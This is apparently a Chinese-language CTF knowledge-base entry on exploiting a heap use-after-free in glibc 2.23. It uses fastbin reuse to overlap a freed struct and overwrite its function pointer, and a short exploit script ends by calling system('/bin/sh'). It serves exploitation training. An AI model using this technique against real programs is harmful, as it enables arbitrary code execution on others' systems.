---
title: 堆 UAF — Fastbin Overlap + 函数指针劫持
category: pwn
tags: [heap, uaf, fastbin, overlap, function-pointer-hijack, glibc-2.23]
triggers: [UAF, fastbin, 堆利用, 函数指针, overlap, double free, glibc 2.23, fastbin LIFO]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/pwn/PWN-UserManager_UAF函数指针劫持.md]
---

## Summary

Delete 后指针未置 NULL → UAF → fastbin LIFO 分配导致新旧对象重叠 → 篡改结构体中函数指针 → `system("/bin/sh")`。

## Key Points

- 堆题三板斧：1) 读保护 2) 找结构体 3) 利用分配器特性
- fastbin 在 glibc 2.23 没有 double free 检测
- 结构体大小 0x18 → malloc(0x18) → 0x20 chunk

## Details

### 利用链

```python
register(0, 0x80, b'A' * 0x80)    # 用户0: 大块
register(1, 0x80, b'B' * 0x80)    # 用户1: 屏障
delete(0)                          # struct0 → 0x20 fastbin
register(2, 16, b'\x01' * 16)     # pass2 从 fastbin 获取 struct0
# 现在 users[0] (dangling) → pass2
edit(2, p64(binsh_addr) + p64(system_addr))  # 篡改函数指针
login(0, 7, b'/bin/sh')  # strcmp 匹配 → call system("/bin/sh")
```

结构体中有函数指针 `void (*show)(char*)` 在 `+0x08` 偏移，Login 成功后会调用它。

## Connections

- Related: [[ret2win]]
- Related: [[ret2text-stack-alignment]]
